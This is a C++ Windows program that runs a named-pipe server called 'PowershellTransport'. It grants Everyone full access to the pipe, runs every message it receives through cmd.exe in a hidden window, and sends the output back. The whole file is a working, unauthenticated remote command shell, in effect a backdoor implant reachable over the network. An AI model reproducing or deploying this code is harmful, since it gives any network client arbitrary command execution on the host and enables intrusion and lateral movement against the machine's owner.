#include <windows.h> 
#include <stdio.h> 
#include <tchar.h>
#include <strsafe.h>
#include <aclapi.h>
#include <string>
#include <iostream>
#pragma comment(lib, "advapi32.lib")


#define BUFSIZE 65536

DWORD WINAPI InstanceThread(LPVOID);
VOID GetAnswerToRequest(LPTSTR, LPTSTR, LPDWORD);

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
//int _tmain(VOID){
    BOOL   fConnected = FALSE;
    DWORD  dwThreadId = 0;
    HANDLE server = INVALID_HANDLE_VALUE;
    HANDLE hThread = NULL;
    LPCTSTR lpszPipename = TEXT("\\\\.\\pipe\\PowershellTransport");

    /*
    ---------------------------------------------------------------------------------------------------------
    This section has some messy looking stuff to create the Security Attributes structure
    This grants 'everyone' explicit access to the pipe, meaning it should accept network connections regardless of user
    */

    DWORD dwRes;
    PSID pEveryoneSID = NULL, pAdminSID = NULL;
    PACL pACL = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    EXPLICIT_ACCESS ea[2];
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
    SECURITY_ATTRIBUTES sa;

    // Create a well-known SID for the Everyone group.
    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,
        SECURITY_WORLD_RID,
        0, 0, 0, 0, 0, 0, 0,
        &pEveryoneSID))
    {
        _tprintf(_T("AllocateAndInitializeSid Error %u\n"), GetLastError());
        //goto Cleanup;
    }

    // Initialize an EXPLICIT_ACCESS structure for an ACE.
    // The ACE will allow Everyone all access to the key.
    ZeroMemory(&ea, 1 * sizeof(EXPLICIT_ACCESS));
    ea[0].grfAccessPermissions = FILE_ALL_ACCESS;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName = (LPTSTR)pEveryoneSID;

    // Create a SID for the BUILTIN\Administrators group.
    if (!AllocateAndInitializeSid(&SIDAuthNT, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &pAdminSID))
    {
        _tprintf(_T("AllocateAndInitializeSid Error %u\n"), GetLastError());
    }

    // Create a new ACL that contains the new ACEs.
    dwRes = SetEntriesInAcl(1, ea, NULL, &pACL);
    if (ERROR_SUCCESS != dwRes)
    {
        _tprintf(_T("SetEntriesInAcl Error %u\n"), GetLastError());
    }

    // Initialize a security descriptor.  
    pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
        SECURITY_DESCRIPTOR_MIN_LENGTH);
    if (NULL == pSD)
    {
        _tprintf(_T("LocalAlloc Error %u\n"), GetLastError());
    }

    if (!InitializeSecurityDescriptor(pSD,
        SECURITY_DESCRIPTOR_REVISION))
    {
        _tprintf(_T("InitializeSecurityDescriptor Error %u\n"),
            GetLastError());
    }

    // Add the ACL to the security descriptor. 
    if (!SetSecurityDescriptorDacl(pSD,
        TRUE,     // bDaclPresent flag   
        pACL,
        FALSE))   // not a default DACL 
    {
        _tprintf(_T("SetSecurityDescriptorDacl Error %u\n"),
            GetLastError());
    }

    // Initialize a security attributes structure.
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = pSD;
    sa.bInheritHandle = FALSE;

    /*
    ---------------------------------------------------------------------------------------------------------
    */



    // The main loop creates an instance of the named pipe and 
    // then waits for a client to connect to it. When the client 
    // connects, a thread is created to handle communications 
    // with that client, and this loop is free to wait for the
    // next client connect request. It is an infinite loop.

    for (;;)
    {
        _tprintf(TEXT("\nPipe Server: Main thread awaiting client connection on %s\n"), lpszPipename);
        server = CreateNamedPipe(
            lpszPipename,             // pipe name 
            PIPE_ACCESS_DUPLEX,       // read/write access 
            PIPE_TYPE_MESSAGE |       // message type pipe 
            PIPE_READMODE_MESSAGE |   // message-read mode 
            PIPE_WAIT,                // blocking mode 
            PIPE_UNLIMITED_INSTANCES, // max. instances  
            BUFSIZE,                  // output buffer size 
            BUFSIZE,                  // input buffer size 
            0,                        // client time-out 
            &sa);                    // default security attribute 

        if (server == INVALID_HANDLE_VALUE)
        {
            _tprintf(TEXT("CreateNamedPipe failed, GLE=%d.\n"), GetLastError());
            return -1;
        }

        // Wait for the client to connect; if it succeeds, 
        // the function returns a nonzero value. If the function
        // returns zero, GetLastError returns ERROR_PIPE_CONNECTED. 

        fConnected = ConnectNamedPipe(server, NULL);
        if (fConnected)
        {
            printf("Client connected, creating a processing thread.\n");

            // Create a thread for this client. 
            hThread = CreateThread(
                NULL,              // no security attribute 
                0,                 // default stack size 
                InstanceThread,    // thread proc
                (LPVOID)server,    // thread parameter 
                0,                 // not suspended 
                &dwThreadId);      // returns thread ID 

            if (hThread == NULL)
            {
                _tprintf(TEXT("CreateThread failed, GLE=%d.\n"), GetLastError());
                return -1;
            }
            else CloseHandle(hThread);
        }
        else
            // The client could not connect, so close the pipe. 
            CloseHandle(server);
    }
    return 0;
}

DWORD WINAPI InstanceThread(LPVOID lpvParam)
// This routine is a thread processing function to read from and reply to a client
// via the open pipe connection passed from the main loop. Note this allows
// the main loop to continue executing, potentially creating more threads of
// of this procedure to run concurrently, depending on the number of incoming
// client connections.
{
    HANDLE hHeap = GetProcessHeap();
    TCHAR* pchRequest = (TCHAR*)HeapAlloc(hHeap, 0, BUFSIZE * sizeof(TCHAR));
    TCHAR* pchReply = (TCHAR*)HeapAlloc(hHeap, 0, BUFSIZE * sizeof(TCHAR));

    DWORD cbBytesRead = 0, cbReplyBytes = 0, cbWritten = 0;
    BOOL fSuccess = FALSE;
    HANDLE hPipe = NULL;

    // Do some extra error checking since the app will keep running even if this
    // thread fails.

    if (lpvParam == NULL)
    {
        printf("\nERROR - Pipe Server Failure:\n");
        printf("   InstanceThread got an unexpected NULL value in lpvParam.\n");
        printf("   InstanceThread exitting.\n");
        if (pchReply != NULL) HeapFree(hHeap, 0, pchReply);
        if (pchRequest != NULL) HeapFree(hHeap, 0, pchRequest);
        return (DWORD)-1;
    }

    if (pchRequest == NULL)
    {
        printf("\nERROR - Pipe Server Failure:\n");
        printf("   InstanceThread got an unexpected NULL heap allocation.\n");
        printf("   InstanceThread exitting.\n");
        if (pchReply != NULL) HeapFree(hHeap, 0, pchReply);
        return (DWORD)-1;
    }

    if (pchReply == NULL)
    {
        printf("\nERROR - Pipe Server Failure:\n");
        printf("   InstanceThread got an unexpected NULL heap allocation.\n");
        printf("   InstanceThread exitting.\n");
        if (pchRequest != NULL) HeapFree(hHeap, 0, pchRequest);
        return (DWORD)-1;
    }

    // Print verbose messages. In production code, this should be for debugging only.
    printf("InstanceThread created, receiving and processing messages.\n");

    // The thread's parameter is a handle to a pipe object instance. 
    hPipe = (HANDLE)lpvParam;

    // Loop until done reading
    while (1)
    {
        // Read client requests from the pipe. This simplistic code only allows messages
        // up to BUFSIZE characters in length.
        fSuccess = ReadFile(
            hPipe,        // handle to pipe 
            pchRequest,    // buffer to receive data 
            BUFSIZE * sizeof(TCHAR), // size of buffer 
            &cbBytesRead, // number of bytes read 
            NULL);        // not overlapped I/O 

        if (!fSuccess || cbBytesRead == 0)
        {
            if (GetLastError() == ERROR_BROKEN_PIPE)
            {
                _tprintf(TEXT("InstanceThread: client disconnected.\n"));
            }
            else
            {
                _tprintf(TEXT("InstanceThread ReadFile failed, GLE=%d.\n"), GetLastError());
            }
            break;
        }

        // Process the incoming message.
        GetAnswerToRequest(pchRequest, pchReply, &cbReplyBytes);
        std::wcout << "Writing "  << cbReplyBytes << "bytes: \n" << pchReply;

        // Write the reply to the pipe. 
        fSuccess = WriteFile(
            hPipe,        // handle to pipe 
            pchReply,     // buffer to write from 
            cbReplyBytes, // number of bytes to write 
            &cbWritten,   // number of bytes written 
            NULL);        // not overlapped I/O 

        if (!fSuccess || cbReplyBytes != cbWritten)
        {
            _tprintf(TEXT("InstanceThread WriteFile failed, GLE=%d.\n"), GetLastError());
            break;
        }
    }

    // Flush the pipe to allow the client to read the pipe's contents 
    // before disconnecting. Then disconnect the pipe, and close the 
    // handle to this pipe instance. 

    FlushFileBuffers(hPipe);
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);

    HeapFree(hHeap, 0, pchRequest);
    HeapFree(hHeap, 0, pchReply);

    printf("InstanceThread exiting.\n");
    return 1;
}


//Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
//Returns string buffer containing command output 
std::wstring execCmd(std::wstring cmd, DWORD MAX_TIME)
{    
    BOOL ok = TRUE;
    HANDLE hStdInPipeRead = NULL;
    HANDLE hStdInPipeWrite = NULL;
    HANDLE hStdOutPipeRead = NULL;
    HANDLE hStdOutPipeWrite = NULL;
    SYSTEMTIME startTime, currentTime;
    FILETIME startFTime, currentFTime;

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    ok = CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0);
    if (ok == FALSE) return L"BAD";
    ok = CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0);
    if (ok == FALSE) return L"BAD";

    // Create the process.
    STARTUPINFO si = { };
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdError = hStdOutPipeWrite;
    si.hStdOutput = hStdOutPipeWrite;
    si.hStdInput = hStdInPipeRead;

    PROCESS_INFORMATION pi = { };
    
    std::string output;
    cmd = L"cmd.exe /C " + cmd;
    LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL;
    LPSECURITY_ATTRIBUTES lpThreadAttribute = NULL;
    BOOL bInheritHandles = TRUE;
    DWORD dwCreationFlags = CREATE_NO_WINDOW;
    LPVOID lpEnvironment = NULL;
    LPCWSTR lpCurrentDirectory = NULL;

    ok = CreateProcess(
        NULL,
        (LPWSTR)cmd.c_str(),
        lpProcessAttributes,
        lpThreadAttribute,
        bInheritHandles,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        &si,
        &pi);
    if (ok == FALSE) return L"BAD";

    // Close pipes we do not need.
    CloseHandle(hStdOutPipeWrite);
    CloseHandle(hStdInPipeRead);

    GetSystemTime(&startTime);
    GetSystemTime(&currentTime);
    SystemTimeToFileTime(&startTime, &startFTime);
    SystemTimeToFileTime(&currentTime, &currentFTime);

    // The main loop for reading output from the command
    char buf[1024 + 1] = { };
    DWORD dwRead = 0;
    DWORD dwAvail = 0;
    
    //TODO Handle timeouts so ping -t doesn't kill the shell
    do {
        GetSystemTime(&currentTime);
        SystemTimeToFileTime(&currentTime, &currentFTime);
        buf[dwRead] = '\0';
        output += buf;
    } while (ReadFile(hStdOutPipeRead, buf, 1024, &dwRead, NULL));

    // Clean up and exit.
    CloseHandle(hStdOutPipeRead);
    CloseHandle(hStdInPipeWrite);
    DWORD dwExitCode = 0;
    GetExitCodeProcess(pi.hProcess, &dwExitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    std::wstring wstr(output.begin(), output.end());
    return wstr;
}


VOID GetAnswerToRequest(LPTSTR pchRequest, LPTSTR pchReply, LPDWORD pchBytes)
    // This routine is a simple function to print the client request to the console
    // and populate the reply buffer with a default data string. This is where you
    // would put the actual client request processing code that runs in the context
    // of an instance thread. Keep in mind the main thread will continue to wait for
    // and receive other client connections while the instance thread is working.
{
    _tprintf(TEXT("Client Request String:\"%s\"\n"), pchRequest);
    std::wstring request = std::wstring(pchRequest);
    std::wstring execOut = execCmd(request, 10000);

    // Check the outgoing message to make sure it's not empty.
    if (execOut.empty())
    {
        *pchBytes = 0;
        pchReply[0] = 0;
        StringCchCopy(pchReply, BUFSIZE, TEXT("No response"));
        printf("ExecCommand - no output. May have failed.\n");
        *pchBytes = (lstrlen(pchReply) + 1) * sizeof(TCHAR);
        return;
    }
    // If the message fails to copy, print no outgoing messages. If it copies successfully, the message will be in the buffer.
    else if (FAILED(StringCchCopy(pchReply, BUFSIZE, execOut.c_str())))
    {
        *pchBytes = 0;
        pchReply[0] = 0;
        printf("StringCchCopy failed, no outgoing message.\n");
        return;
    }
    pchReply[BUFSIZE - 1] = '\0';
    *pchBytes = (lstrlen(pchReply) + 1) * sizeof(TCHAR);
    return;
}